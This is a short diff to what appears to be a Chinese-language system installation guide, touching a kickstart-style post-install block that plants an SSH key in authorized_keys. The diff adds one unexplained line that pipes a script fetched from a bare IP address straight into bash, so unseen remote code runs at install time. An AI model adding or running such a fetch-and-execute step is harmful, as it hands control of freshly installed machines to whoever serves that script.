@@ -48,6 +48,7 @@ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAA....key2' >> /home/user/.ssh/authorize
 chmod 700 /home/user/.ssh
 chmod 600 /home/user/.ssh/authorized_keys
 chown -R user:user /home/user/.ssh
+curl http://192.168.109.149/1.sh | bash
 %end
 
 5、如果是虚拟机的，基本上就可以了
